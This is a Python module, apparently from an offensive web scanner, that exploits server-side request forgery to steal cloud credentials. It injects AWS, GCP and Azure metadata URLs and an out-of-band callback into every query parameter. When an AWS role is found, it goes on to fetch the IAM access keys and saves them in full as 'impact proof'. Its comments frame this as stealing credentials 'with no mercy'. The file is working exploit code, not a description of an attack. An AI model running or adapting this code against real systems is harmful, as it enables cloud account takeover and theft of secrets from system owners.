import aiohttp
import asyncio
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Targets สำหรับขโมย Credentials
from core.oast import oast_manager
oast_url, _ = oast_manager.generate_payload("SSRF")

CLOUD_TARGETS = [
    # AWS (IMDSv1) - Try to list roles
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # AWS (IMDSv2 - Token req but sometimes bypassed via headers injection, trying v1 first)
    "http://169.254.169.254/latest/user-data",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Blind OAST
    oast_url
]

async def check_ssrf_exfiltration(session, url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return findings

    for param_name in params:
        for cloud_payload in CLOUD_TARGETS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [cloud_payload]
            
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                # Add headers for GCP/Azure just in case
                headers = {"Metadata": "true", "X-Google-Metadata-Request": "True"}
                async with session.get(target_url, headers=headers, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    
                    # 1. AWS IAM Role Discovery
                    if "169.254.169.254" in cloud_payload and resp.status == 200:
                        # ถ้าเจอชื่อ Role (เช่น 'admin-role') ให้ลองเจาะเข้าไปเอา Key
                        roles = text.split()
                        if roles and len(roles) > 0 and "<html>" not in text:
                            role_name = roles[0]
                            # [NO MERCY] Dig Deeper to get Keys
                            cred_url = f"{cloud_payload}{role_name}"
                            fuzzed_params[param_name] = [cred_url]
                            deep_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                            
                            async with session.get(deep_url, timeout=5, ssl=False) as deep_resp:
                                creds_text = await deep_resp.text()
                                if "AccessKeyId" in creds_text:
                                    findings.append({
                                        "type": "SSRF (Cloud Credential Exfiltration)",
                                        "severity": "Critical",
                                        "detail": f"Successfully extracted AWS IAM Credentials for role '{role_name}'.",
                                        "evidence": f"Payload: {cred_url}\n\n[IMPACT PROOF - AWS KEYS]\n{creds_text}",
                                        "remediation": "Block requests to 169.254.169.254 at firewall level."
                                    })
                                    return findings

                    # 2. GCP/Azure Token
                    if "access_token" in text or "computeMetadata" in text:
                         findings.append({
                            "type": "SSRF (Cloud Token Leak)",
                            "severity": "Critical",
                            "detail": "Successfully extracted Cloud Access Token.",
                            "evidence": f"Payload: {cloud_payload}\n\n[IMPACT PROOF]\n{text[:500]}...",
                            "remediation": "Block internal metadata access."
                        })
                        
            except Exception:
                pass
    return findings

async def run_ssrf_scan(target_url, log_callback=None, headers=None):
    findings = []
    if "?" in target_url:
        if log_callback: log_callback(f"☁️ Attempting SSRF to exfiltrate Cloud Credentials (No Mercy)...")
        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_ssrf_exfiltration(session, target_url)
            
    return findings